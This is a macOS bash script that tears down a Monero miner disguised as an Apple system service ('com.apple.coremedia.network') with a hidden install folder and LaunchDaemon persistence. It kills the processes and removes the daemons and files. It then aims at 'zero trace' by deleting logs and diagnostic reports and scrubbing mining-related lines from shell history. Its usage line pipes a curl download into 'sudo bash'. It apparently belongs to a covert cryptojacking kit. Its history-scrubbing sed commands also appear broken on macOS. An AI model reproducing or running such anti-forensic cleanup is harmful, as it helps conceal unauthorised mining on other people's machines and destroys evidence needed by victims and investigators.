#!/usr/bin/env bash
# remove_xmr.sh — Zero-trace removal of XMR miner

DISGUISE_NAME="com.apple.coremedia.network"
INSTALL_DIR="/Library/Application Support/.cmnd"
PLIST_PATH="/Library/LaunchDaemons/${DISGUISE_NAME}.plist"
CAFF_PLIST="/Library/LaunchDaemons/com.apple.caffeinated.plist"
LOG_PATH="/Library/Logs/${DISGUISE_NAME}.log"

if [[ $EUID -ne 0 ]]; then
  echo "[!] Run with sudo: sudo curl -fsSL .../remove_xmr.sh | sudo bash"
  exit 1
fi

echo ""
echo "=========================================="
echo " XMR Miner — Full Removal"
echo "=========================================="

echo "[1/6] Killing process..."
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Killed" || echo "      — Not running"
pkill -9 -f "xmrig" 2>/dev/null || true
pkill -9 -f "caffeinate" 2>/dev/null || true
sleep 1

echo "[2/6] Removing LaunchDaemons..."
launchctl bootout system "$PLIST_PATH" 2>/dev/null || true
launchctl bootout system "$CAFF_PLIST" 2>/dev/null || true
launchctl bootout "gui/$(id -u)/${DISGUISE_NAME}" 2>/dev/null || true
rm -f "$PLIST_PATH" "$CAFF_PLIST"
rm -f /Library/LaunchAgents/${DISGUISE_NAME}.plist 2>/dev/null || true
echo "      ✓ LaunchDaemons removed"

echo "[3/6] Removing files..."
rm -rf "$INSTALL_DIR" && echo "      ✓ Install dir removed"

echo "[4/6] Wiping logs..."
rm -f "$LOG_PATH" && echo "      ✓ Log wiped"
find /Library/Logs/DiagnosticReports -name "*coremedia.network*" -delete 2>/dev/null || true

echo "[5/6] Restoring power settings..."
pmset -a sleep 1
pmset -a displaysleep 10
pmset -a standby 1
echo "      ✓ Sleep settings restored"

echo "[6/6] Cleaning mining traces..."
  # Only remove mining-specific lines, not full history
  sed -i '/mine_qrl|xmrig|supportxmr|coremedia.network/d' "$HOME/.zsh_history" 2>/dev/null || true
  sed -i '/mine_qrl|xmrig|supportxmr|coremedia.network/d' "$HOME/.bash_history" 2>/dev/null || true

echo ""
[[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" ]] \
  && echo " ✓  Complete — Zero trace remaining." \
  || echo " [!] Check manually."
echo "=========================================="
